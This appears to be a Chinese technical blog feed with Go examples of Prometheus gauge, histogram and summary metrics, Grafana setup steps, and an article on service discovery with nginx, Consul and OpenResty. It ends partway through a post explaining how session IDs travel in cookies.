<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 2.1</strong></p>
<p>现实场景中，很多数据并不是单调递增的，比如操作系统中内存、CPU 资源的使用，不同时间点上数值上下波动是很正常的。在 Prometheus 中这种数据类型，适合用仪表盘（Guage）来进行处理。</p>
<p><img src="/images/image-20220218154349451.png" alt="image-20220218154349451"></p>
<p><strong>图 2.6</strong></p>
<p>下面是一个使用仪表盘的 go 示例代码：</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"time"</span>
	<span class="token string">"math/rand"</span>
	<span class="token string">"github.com/prometheus/client_golang/prometheus"</span>
	<span class="token string">"github.com/prometheus/client_golang/prometheus/promhttp"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	opsQueued <span class="token operator">:=</span> prometheus<span class="token punctuation">.</span><span class="token function">NewGauge</span><span class="token punctuation">(</span>prometheus<span class="token punctuation">.</span>GaugeOpts<span class="token punctuation">&#123;</span>
		Namespace<span class="token punctuation">:</span> <span class="token string">"our_company"</span><span class="token punctuation">,</span>
		Subsystem<span class="token punctuation">:</span> <span class="token string">"blob_storage"</span><span class="token punctuation">,</span>
		Name<span class="token punctuation">:</span>      <span class="token string">"ops_queued"</span><span class="token punctuation">,</span>
		Help<span class="token punctuation">:</span>      <span class="token string">"Number of blob storage operations waiting to be processed."</span><span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	prometheus<span class="token punctuation">.</span><span class="token function">MustRegister</span><span class="token punctuation">(</span>opsQueued<span class="token punctuation">)</span>
	<span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">for</span> <span class="token punctuation">&#123;</span>
			num <span class="token operator">:=</span> rand<span class="token punctuation">.</span><span class="token function">Intn</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
			<span class="token keyword">if</span> num <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">&#123;</span>
				opsQueued<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token function">float64</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">)</span>
			<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
				opsQueued<span class="token punctuation">.</span><span class="token function">Sub</span><span class="token punctuation">(</span><span class="token function">float64</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">&#125;</span>
			
			time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	
	http<span class="token punctuation">.</span><span class="token function">Handle</span><span class="token punctuation">(</span><span class="token string">"/metrics"</span><span class="token punctuation">,</span> promhttp<span class="token punctuation">.</span><span class="token function">Handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":2112"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 2.2</strong></p>
<p>再考虑这么一种场景，就是你在记录响应时间数据时，希望对于当前服务的响应时间有一个估算值，在某些极端情况下，服务器确实会出现响应超长的情况，你想在查看的时候能够将这些异常值和正常值区分开。一个比较好的方法就是绘制直方图，将不同响应时间区间内的数据分开展示出来。Prometheus 中直接就含有直方图（Histogram）的指标类型。借助于 grafana，我们能够呈现出如下的图形，方便查阅</p>
<p><img src="/images/image-20220218133244968.png" alt="image-20220218133244968"></p>
<p><strong>图 2.7</strong></p>
<p>对应的数据生成的 go 代码如下：</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"math/rand"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"time"</span>

	<span class="token string">"github.com/prometheus/client_golang/prometheus"</span>
	<span class="token string">"github.com/prometheus/client_golang/prometheus/promhttp"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	durations <span class="token operator">:=</span> prometheus<span class="token punctuation">.</span><span class="token function">NewHistogram</span><span class="token punctuation">(</span>prometheus<span class="token punctuation">.</span>HistogramOpts<span class="token punctuation">&#123;</span>
		Name<span class="token punctuation">:</span>    <span class="token string">"pond_duration_req"</span><span class="token punctuation">,</span>
		Help<span class="token punctuation">:</span>    <span class="token string">"The duration of request process."</span><span class="token punctuation">,</span> <span class="token comment">// Sorry, we can't measure how badly it smells.</span>
		Buckets<span class="token punctuation">:</span> prometheus<span class="token punctuation">.</span><span class="token function">LinearBuckets</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0.2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">// 5 buckets, each 0.2 centigrade wide.</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	prometheus<span class="token punctuation">.</span><span class="token function">MustRegister</span><span class="token punctuation">(</span>durations<span class="token punctuation">)</span>
	<span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">for</span> <span class="token punctuation">&#123;</span>
			rand<span class="token punctuation">.</span><span class="token function">Seed</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">UnixNano</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//设置随机种子，使每次结果不一样</span>
			i <span class="token operator">:=</span> <span class="token function">float64</span><span class="token punctuation">(</span>rand<span class="token punctuation">.</span><span class="token function">Intn</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">100</span>
			durations<span class="token punctuation">.</span><span class="token function">Observe</span><span class="token punctuation">(</span> i<span class="token punctuation">)</span>
			
			time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	
	http<span class="token punctuation">.</span><span class="token function">Handle</span><span class="token punctuation">(</span><span class="token string">"/metrics"</span><span class="token punctuation">,</span> promhttp<span class="token punctuation">.</span><span class="token function">Handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":2112"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 2.3</strong></p>
<p>注意，虽然在代码中指定的指标名字为 <code>pond_duration_req</code>，在 Prometheus 中存储的时候，会被转为 <code>pond_duration_req_bucket</code> 这个名字。</p>
<p>和直方图类似，摘要（Summary）也提供了数据聚合功能，不过它是将数据按照百分比进行聚合，比如说占总量 50% 的数据有多少，占总量 90% 的数据有多少。</p>
<p><img src="/images/image-20220218154554996.png" alt="image-20220218154554996"></p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"math"</span>
	<span class="token string">"time"</span>
	<span class="token string">"github.com/prometheus/client_golang/prometheus"</span>
	<span class="token string">"github.com/prometheus/client_golang/prometheus/promhttp"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	temps <span class="token operator">:=</span> prometheus<span class="token punctuation">.</span><span class="token function">NewSummary</span><span class="token punctuation">(</span>prometheus<span class="token punctuation">.</span>SummaryOpts<span class="token punctuation">&#123;</span>
		Name<span class="token punctuation">:</span>       <span class="token string">"demo_temperature_summary"</span><span class="token punctuation">,</span>
		Help<span class="token punctuation">:</span>       <span class="token string">"The temperature of the frog pond."</span><span class="token punctuation">,</span>
		Objectives<span class="token punctuation">:</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">float64</span><span class="token punctuation">]</span><span class="token builtin">float64</span><span class="token punctuation">&#123;</span><span class="token number">0.5</span><span class="token punctuation">:</span> <span class="token number">0.05</span><span class="token punctuation">,</span> <span class="token number">0.9</span><span class="token punctuation">:</span> <span class="token number">0.01</span><span class="token punctuation">,</span> <span class="token number">0.99</span><span class="token punctuation">:</span> <span class="token number">0.001</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token comment">//每个百分比计算的允许误差</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	prometheus<span class="token punctuation">.</span><span class="token function">MustRegister</span><span class="token punctuation">(</span>temps<span class="token punctuation">)</span>
	<span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token comment">// Simulate some observations.</span>
		<span class="token keyword">for</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>
				temps<span class="token punctuation">.</span><span class="token function">Observe</span><span class="token punctuation">(</span><span class="token number">30</span> <span class="token operator">+</span> math<span class="token punctuation">.</span><span class="token function">Floor</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token operator">*</span>math<span class="token punctuation">.</span><span class="token function">Sin</span><span class="token punctuation">(</span><span class="token function">float64</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">)</span>
			<span class="token punctuation">&#125;</span>

			time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span>
		<span class="token punctuation">&#125;</span>
		
	<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

	http<span class="token punctuation">.</span><span class="token function">Handle</span><span class="token punctuation">(</span><span class="token string">"/metrics"</span><span class="token punctuation">,</span> promhttp<span class="token punctuation">.</span><span class="token function">Handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":2112"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 2.4</strong></p>
<h2 id="3-使用-grafana-展示数据"><a href="#3-使用-grafana-展示数据" class="headerlink" title="3. 使用 grafana 展示数据"></a>3. 使用 grafana 展示数据</h2><p>第二小节已经展示了若干 grafana 中图标，这一小节讲述 grafana 的具体配置。首先选择配置按钮，然后选择 <code>Data Sources</code> 菜单，接着点击 <code>Add data source</code> 按钮，再打开的列表中选择 <code>Prometheus</code> 选项。</p>
<p><img src="/images/image-20220218160509680.png" alt="image-20220218160509680"></p>
<p><strong>图 3.1</strong></p>
<p>在 <code>URL</code> 栏填写正确的 Prometheus 的访问地址，默认情况下这个输入框中会显示一个值为 <code>http://localhost:9090</code> 的 placeholder，即使你当前 Prometheus 的访问地址确实是 <code>http://localhost:9090</code>，依然要填写上一遍，否则该值就是空的。</p>
<p>最后把滚动条拉到最后，点击按钮 <code>Save &amp; test</code>，正常情况下会提示成功。</p>
<p><img src="/images/image-20220218160750176.png" alt="image-20220218160750176"></p>
<p><strong>图 3.2</strong></p>
<p>接着选择 <code>+</code> 按钮，然后选择 <code>Dashboard</code>，然后选择 <code>Add a new panel</code>，然后在 <code>Metrics browser</code> 输入框中填入一个 Prometheus 中的立即向量表达式，比如说 <code>pond_duration_req_bucket&#123;instance=&quot;host.docker.internal:2112&quot;&#125;</code>，默认情况下图表会以时间线的形式显示出来，如 <strong>图3.5</strong> 所示。当然你也可以在右上角下拉选择不同的图标展示模式，如 <strong>图 3.6</strong> 所示。</p>
<p><img src="/images/image-20220218161148473.png" alt="image-20220218161148473"></p>
<p><strong>图 3.3</strong></p>
<p><img src="/images/image-20220218161303568.png" alt="image-20220218161303568"></p>
<p><strong>图 3.4</strong></p>
<p><img src="/images/image-20220218161552531.png" alt="image-20220218161552531"></p>
<p><strong>图 3.5</strong></p>
<p><img src="/images/image-20220218162106609.png" alt="image-20220218162106609"></p>
<p><strong>图 3.6</strong></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>Prometheus Cheat Sheet - Basics (Metrics, Labels, Time Series, Scraping) <a href="https://iximiuz.com/en/posts/prometheus-metrics-labels-time-series/">https://iximiuz.com/en/posts/prometheus-metrics-labels-time-series/</a></li>
</ul>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>本教程代码可以从这里找到 <a href="https://gitlab.com/yunnysunny/prometheus-learn">https://gitlab.com/yunnysunny/prometheus-learn</a></p>
]]></content>
      <categories>
        <category>Prometheus</category>
      </categories>
  </entry>
  <entry>
    <title>服务发现揭秘</title>
    <url>/posts/service-discovery-start/</url>
    <content><![CDATA[<h2 id="1-问题描述"><a href="#1-问题描述" class="headerlink" title="1. 问题描述"></a>1. 问题描述</h2><p>随着互联网业务的发展，互联网用户基数越来越大，对于服务提供者来说带来的并发压力也越来越大。以往通过单机提供服务的方式已经被淘汰，多机冗余、负载均衡等名词也已经成为当前服务开发的基本要求。如何感知到一个服务的多个节点，如何平滑的对于服务进行扩容，如何保证负载均衡的高效性，传统的负载均衡基础设施面对越来越多的挑战。而服务发现技术的出现，对于上述问题带来了一个更有的解决方案。</p>
<p><img src="/images/balancer_classic.png"></p>
<p><strong>图 1.1</strong></p>
<p>传统的负载均衡服务就如 <strong>图 1.1</strong> 所示，一个负载均衡服务器后面挂载若干服务，每个服务都要 N 个节点。由于目前常用的免费负载均衡方案中，nginx 的使用率更广，下面所有的讲解都是以 nginx 为模板。简单起见，我们首先考虑部署在内网中，服务和服务相互调用的情况。</p>
<p>我们假设 <code>服务1</code> 的端口为 <code>8080</code>，那么配置 <code>服务1</code> 的nginx 配置文件可能就是这个样子的：</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">upstream</span> service1</span> <span class="token punctuation">&#123;</span>
    <span class="token directive"><span class="token keyword">server</span> 192.168.1.2:8080</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">server</span> 192.168.1.3:8080</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">server</span> 192.168.1.4:8080</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token directive"><span class="token keyword">server</span></span> <span class="token punctuation">&#123;</span>
    <span class="token directive"><span class="token keyword">listen</span>       <span class="token number">8080</span></span><span class="token punctuation">;</span>

    <span class="token directive"><span class="token keyword">location</span> ^~ /api/</span> <span class="token punctuation">&#123;</span>
        <span class="token directive"><span class="token keyword">proxy_pass</span>  http://service1</span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_redirect</span> <span class="token boolean">off</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Forwarded-Proto <span class="token variable">$scheme</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Real-IP <span class="token variable">$remote_addr</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Forwarded-For <span class="token variable">$proxy_add_x_forwarded_for</span></span><span class="token punctuation">;</span>    
        <span class="token directive"><span class="token keyword">proxy_set_header</span> Host <span class="token variable">$http_host</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_connect_timeout</span>   <span class="token number">120</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_send_timeout</span>      <span class="token number">120</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_read_timeout</span>      <span class="token number">120</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token directive"><span class="token keyword">location</span> /</span> <span class="token punctuation">&#123;</span>
        <span class="token directive"><span class="token keyword">root</span> /opt/dist/</span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">index</span> index.html</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>代码 1.1</strong></p>
<p><strong>代码 1.1</strong> 中，访问 <a href="http://nginxip:8080/api">http://nginxip:8080/api</a> 开头的链接，都会被反向代理到 <code>192.168.1.2</code> <code>192.168.1.3</code> <code>192.168.1.4</code> 。如果我们机器的节点数变动不大，一切安好，但是随着我们业务量的上升，免不了要增加节点，这时候就必须手动修改 <strong>代码 1.1</strong>，增加所需的节点，然后重启 nginx。如果 <code>服务1</code> 变动不频繁，其实也可以忍。但是我们的 nginx 上可是并不仅仅只有一个 <code>服务1</code> 的，它还有 <code>服务2</code>，未来可预见，还有 <code>服务3</code> <code>服务4</code>。<code>服务1</code> 自己安分守己，但是它无法预见同样跟它一样依赖 nginx 做服务负载均衡的 <code>服务X</code> 在未来的某一天不会抽风。</p>
<h2 id="2-解决方案"><a href="#2-解决方案" class="headerlink" title="2 解决方案"></a>2 解决方案</h2><p>说白了，我们当前的架构中是有类中心化的节点的，我们的 nginx 就是这个中心化的节点。<code>服务X</code> 带来的流量激增会伤害到看上去跟它无关的 <code>服务Y</code>。<code>服务 X</code> 的流量激增，是 <code>服务X</code> 导致的，本着谁污染谁治理的原则，怎么也得是 <code>服务X</code> 的请求者来解决吧，但是由于每个服务都有多个动态变动的节点，请求者并不知道他们的地址。这个时候，就轮到我们的 <code>服务发现</code> 技术闪亮登场了。</p>
<p><code>服务发现</code> 技术解决方案，都会提供一个应用注册中心。服务器端可以将自己的访问地址注册到这个中心里来；然后客户端可以通过监听注册中心中当前服务的变动情况，来动态增加本地维护的服务器列表。</p>
<p><img src="/images/register_and_watch.png"></p>
<p><strong>图 1.2</strong></p>
<p>这样处在中心节点的负载均衡服务组件不复存在，具体到某个应用的流量激增，也就不会直接影响其他应用。也许你会有疑问，注册中心也是中心节点吧，但是注册中心仅仅用来做应用启动注册和节点变动通知，并发的压力的很小，并不会因为流量的增加也受到影响。况且这个所谓的中心节点，也并不仅仅是说只有一个单节点，而是一个高可用的集群结构。</p>
<p>常见的 <code>服务发现</code> 组件有 consul zookeeper etcd 等。本文选用的是 consul ，因为它的使用者比较广泛，且功能比较全面。</p>
<blockquote>
<p>可以参见这篇文章来对比不同组件之间的差异 <a href="http://huhansi.com/2020/04/14/SpringCloud/2020-04-14-004-%E5%90%84%E7%A7%8D%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/">http://huhansi.com/2020/04/14/SpringCloud/2020-04-14-004-%E5%90%84%E7%A7%8D%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0%E6%A1%86%E6%9E%B6%E5%AF%B9%E6%AF%94/</a></p>
</blockquote>
<p>新技术栈的引进，必然会带来改造的工作量。对于服务器端来说，改造不大，仅仅是在应用启动的时候增加一个注册步骤即可。这个注册步骤甚至都可以直接做成一个单独的应用程序，随机器启动，这样对于原有项目代码没有侵入性。</p>
<blockquote>
<p>可以参照笔者写的 <a href="https://github.com/yunnysunny/consul-register">consul-register</a> 项目来做服务注册。这个项目就是通过单独应用来注册服务，不需要修改原有项目代码。</p>
</blockquote>
<p>客户端的改造要复杂些，因为要在客户端本身实现负载均衡算法。</p>
<blockquote>
<p>客户端负载均衡的实现，可以参见笔者写的 <a href="https://github.com/yunnysunny/consul-balancer">consul-balancer</a> 项目。</p>
</blockquote>
<p><strong>图 1.2</strong> 适合的是在集群内部服务器之间相互调用的情况，但是一个服务如果是对公网暴漏访问的，情况会大不同。对于公网访问的服务，我们需要提供 https 支持（这里仅仅考虑七层 HTTP 协议，不考虑四层 socket 长连接的情况）。这时候，我们不得不在公网入口处部署一处 nginx 服务器（也可以是其他类似服务器，这里仅仅来 nginx 举例），配置好 SSL 证书，完成 https 的握手。考虑到这个 nginx 是直接和用户建立连接，如果这个 nginx 只有一台机器，而你的用户群体又分布在全国各地，肯定会出现一定概率某个地域的用户访问这台单节点的 nginx 服务速率慢的问题。所以更优化的方案是全国几个重要的地区各自建立入口点 nginx，最终入口点和业务集群之间的网络拓扑结构会是这样。</p>
<p><img src="/images/edge_to_cluster.png"></p>
<p><strong>图 1.3</strong></p>
<p><strong>图 1.3</strong> 上面画了三个入口，其通过专线连接到了业务集群，但是这里并没有画入口节点是怎么最终连接到 <code>服务X</code> 上的节点的。如果入口节点和集群内部的网络是隔离的，那么入口节点和集群必然要部署一台负载均衡服务器，用来做流量转发。这太负载均衡服务器上绑定两块网卡，一块负责和入口节点通信，一块负责和业务集群通信。</p>
<p><img src="/images/edge_to_balancer.png"></p>
<p><strong>图 1.4</strong></p>
<p><strong>图 1.4</strong> 跟 <strong>图 1.3</strong> 相比，多了一个负载均衡服务器。嗯？但是这个样子的话，岂不是又走回了我们的老路。而且说好的用服务发现呢，这也没发现啊。对于后者我们可以使用 consul-template 这个工具，读取 consul 的服务配置，动态生成 nginx 配置文件，然后重载 nginx 来达到服务发现的目的。</p>
<p><img src="/images/consul_template_in_cluster.png"></p>
<p><strong>图 1.5</strong></p>
<p>使用了 consul-template 之后，我们利用上了服务发现技术栈，但是这里面的负载均衡服务器依然是一个中心节点。虽然我们可以通过增加负载均衡服务器节点个数来承载更高的流量，但是一来这样子会增加更多的机器开销，二来增加负载均衡服务节点，同样要修改入口节点配置。</p>
<p>如果入口节点和业务集群的网络是打通的，问题会好办很多。入口点直接读取注册中心的变动，动态更改本地服务器列表即可。</p>
<p><img src="/images/private_line_with_service_discovery.png"></p>
<p><strong>图 1.6</strong></p>
<p><strong>图 1.6</strong> 简化一下入口点，仅仅画出了一处作为代表。入口节点直接读取注册中心，如果服务有节点变动，便会及时更新本地配置文件，可以直接访问到 <code>服务X</code> 上的节点。</p>
<p>使用 consul-template 其实隐藏了一个问题，服务器上的节点在出现异常的时候，进程可能崩溃退出，注册到注册中心上的节点就会发送变动，consul-template 就会更新入口节点上的配置文件，触发 nginx 的重启。但是 nginx 的重启过程在高并发的情况下，会导致不必要的延迟出现，对于低延迟应用来说是个很大的打击。</p>
<blockquote>
<p>关于重载 nginx 导致的性能问题，可以参见官方的这篇博文 <a href="https://www.nginx.com/blog/using-nginx-plus-to-reduce-the-frequency-of-configuration-reloads/">https://www.nginx.com/blog/using-nginx-plus-to-reduce-the-frequency-of-configuration-reloads/</a></p>
</blockquote>
<p>解决这个问题，我们可以依靠 openresty 这个 nginx 插件，它支持通过 lua 来进行编程，可以拦截 nginx 处理 http 请求的各个阶段。依靠这个特性，我们可以定时拉取各个服务的节点配置信息到 openresty 中存储起来，在客户端触发请求的时候，直接转发请求到具体的某一个节点上面。</p>
<blockquote>
<p>大家可以参考笔者的项目 <a href="https://github.com/yunnysunny/resty-gate">yunnysunny&#x2F;resty-gate</a>，它实现了通过 openresty 动态拉取 consul 上的服务列表并基于此进行负载均衡的功能。</p>
</blockquote>
<p><img src="/images/consul_with_openresty.png"></p>
<p><strong>图 1.7</strong></p>
]]></content>
      <categories>
        <category>Micro Service</category>
      </categories>
  </entry>
  <entry>
    <title>session的安全性</title>
    <url>/posts/session/</url>
    <content><![CDATA[<h2 id="session原理"><a href="#session原理" class="headerlink" title="session原理"></a>session原理</h2><p>提到session，大家肯定会联想到登录，登录成功后记录登录状态，同时标记当前登录用户是谁。功能大体上就是这个样子，但是今天要讲的不是功能，而是实现。通过探讨session的实现方式来发掘一些可能你之前不知道的有趣的事情。<br>为了记录session，在客户端和服务器端都要保存数据，客户端记录一个标记，服务器端不但存储了这个标记同时还存储了这个标记映射的数据。好吧，还是说点白话吧，在客户端记录的其实是一个sessionid，在服务器端记录的是一个key-value形式的数据结构，这里的key肯定是指sessionid了，value就代表session的详细内容。用户在做http请求的时候，总是会把sessionid传递给服务器，然后服务器根据这个sessionid来查询session的内容（也就是上面说到的value）。<br>现在我们重点关注一下sessionid，他是今天问题的关键所在。sessionid在客户端（http的客户端一般就是指浏览器了）是存储在cookie中，当然也有例外（书本上肯定会提到也有保存在url中的，我做程序员这么多年也没有见过这种方式，这难道就是现实和实际的差距吗，好残酷）。<br>我们通过一个例子来阐述一下这个sessionid在session处理时的作用。首先假定这么一个场景，我们有一个cms（content management system，内容管理系统），这个应用有一个后台，用户必须登录才能进入后台进行文章发表等操作。首先是登录流程，用户在浏览器输入用户名、密码，点击登录，浏览器会将用户名密码提交到服务器程序进行处理；服务器验证用户名、密码正确后，会返回登录成功信息，并且会修改服务器端的session内容，比如我们将用户ID写入session中，为了方便存储这些session的内容会被序列化成字符串或者二进制保存在文件或者数据库中，这时候大多数情况下服务器在对当前的http请求进行响应时，会返回一个新的sessionid要求浏览器写入本地cookie中，对应的返回的http响应头部信息应该会是是这个样子的：<code>set-cookie:PHPSESSID=xxxxxxx</code>,浏览器解析到这个头之后就会在当前生成一个cookie关联当前的域名。<br><img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/login.png" alt="登录时序图"><br><strong>图1.1 登录时序图</strong><br>接着用户登录后台进行发表文章操作，登录用户填写文章的标题、内容，然后点击发送。这时候浏览器会生成一条到服务器的http请求，注意这个请求的头部会将存储sessionid的cookie内容发送过去，也就是说请求的http头部信息中应该会有这么一段数据：<code>cookie:PHPSESSID=xxxxxxx;other_cookie_name=yyyyyy</code>；服务器接收到这个http请求之后，解析到cookie存在，且cookie中存在PHPSESSID这个cookie名字，然后就将PHPSESSID的值（也就是sessionid的值）取出来，根据这个PHPSESSID查询服务器上有没有对应的session内容，如果有则将其对应的值取出来进行反序列序列化（也就是将其转成编程语言中的一个数据结果，比如在php中会得到一个<code>$_SESSION</code>数组，在j2ee中会得到类型为<code>javax.servlet.http.HttpSession</code>），方便在程序中进行读取，最终服务器认定session中储存的值存在，并且从反序列化得到的对象中读取到了用户ID属性，然后就往cms数据库的文章表中插入了一条数据，最终返回http响应，告诉浏览器操作成功了。<br><img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/publish.png" alt="发表文章时序图"><br><strong>图1.2 发表文章时序图</strong></p>
